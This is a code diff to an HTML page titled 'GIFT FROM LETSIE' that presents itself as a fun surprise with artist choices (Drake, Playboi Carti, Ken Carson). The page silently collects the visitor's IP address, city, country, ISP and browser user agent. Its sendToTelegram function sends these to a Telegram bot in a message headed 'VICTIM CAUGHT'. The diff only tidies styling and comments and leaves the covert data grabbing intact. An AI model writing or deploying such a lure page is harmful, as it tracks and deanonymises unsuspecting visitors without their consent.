@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>GIFT FROM LETSIE</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght=900&family=Roboto:wght=700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: #000;
@@ -90,7 +90,7 @@
       text-shadow: 0 0 15px #ff0000;
       opacity: 0;
       transition: opacity 1s;
-      line-line: 1.8;
+      line-height: 1.8;
     }
     .by {
       margin-top: 30px;
@@ -161,7 +161,7 @@
 
       <!-- STEP 1: IP -->
       <div id="result-ip" class="result hidden">
-        This is ur ip adress if u didnt know <span style="font-size:2.2rem">😭👅</span><br>
+        This is ur ip adress if u didnt know <span style="font-size:2.2rem">tongue_stuck_out:</span><br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
         <br><br>
         <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
@@ -181,16 +181,21 @@
 
   <!-- ARTIST CHOICE (SCROLL DOWN) -->
   <div class="artists">
+    <!-- DRAKE - Certified Lover Boy -->
     <div class="artist-btn" onclick="chooseArtist('Drake')">
-      <img src="https://i.scdn.co/image/ab67616d0000b273b8d72a5b5a0d5c7b7c1f3e1d" class="artist-img" alt="Drake - Certified Lover Boy">
+      <img src="https://i.scdn.co/image/ab67616d0000b273b8d72a5b5a0d5c7b7c1f3e1d" class="artist-img" alt="Drake - CLB">
       <span>DRAKE</span>
     </div>
+
+    <!-- PLAYBOI CARTI - Whole Lotta Red -->
     <div class="artist-btn" onclick="chooseArtist('Playboi Carti')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Playboi Carti - Whole Lotta Red">
+      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Carti - WLR">
       <span>PLAYBOI CARTI</span>
     </div>
+
+    <!-- KEN CARSON - More Chaos -->
     <div class="artist-btn" onclick="chooseArtist('Ken Carson')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken Carson - More Chaos">
+      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken - More Chaos">
       <span>KEN CARSON</span>
     </div>
   </div>
@@ -215,9 +220,8 @@
 
     let userIP = "";
 
-    // === SEND TO TELEGRAM (PRO FORMAT WITH ISP) ===
+    // === SEND TO TELEGRAM ===
     function sendToTelegram(ip, city = "", country = "", isp = "", device = "", artist = "") {
-      const time = new Date().toLocaleString();
       const site = location.href;
       let message = 
 `VICTIM CAUGHT
@@ -235,7 +239,7 @@ Site: <a href="${site}">${site}</a>`;
         .catch(() => {});
     }
 
-    // === STEP 1: GET IP ===
+    // === GET IP ===
     function getIP() {
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
@@ -250,7 +254,7 @@ Site: <a href="${site}">${site}</a>`;
         });
     }
 
-    // === STEP 2: GET CITY + COUNTRY + ISP ===
+    // === GET LOCATION + ISP ===
     function getLocation() {
       fetch(`https://ipapi.co/${userIP}/json/`)
         .then(r => r.json())
@@ -292,7 +296,7 @@ Site: <a href="${site}">${site}</a>`;
 
     // === ARTIST CHOICE ===
     function chooseArtist(artist) {
-      alert(`You chose: ${artist} 🔥`);
+      alert(`You chose: ${artist} fire`);
       const device = navigator.userAgent.substring(0, 80);
       sendToTelegram(userIP, "", "", "", device, artist);
     }
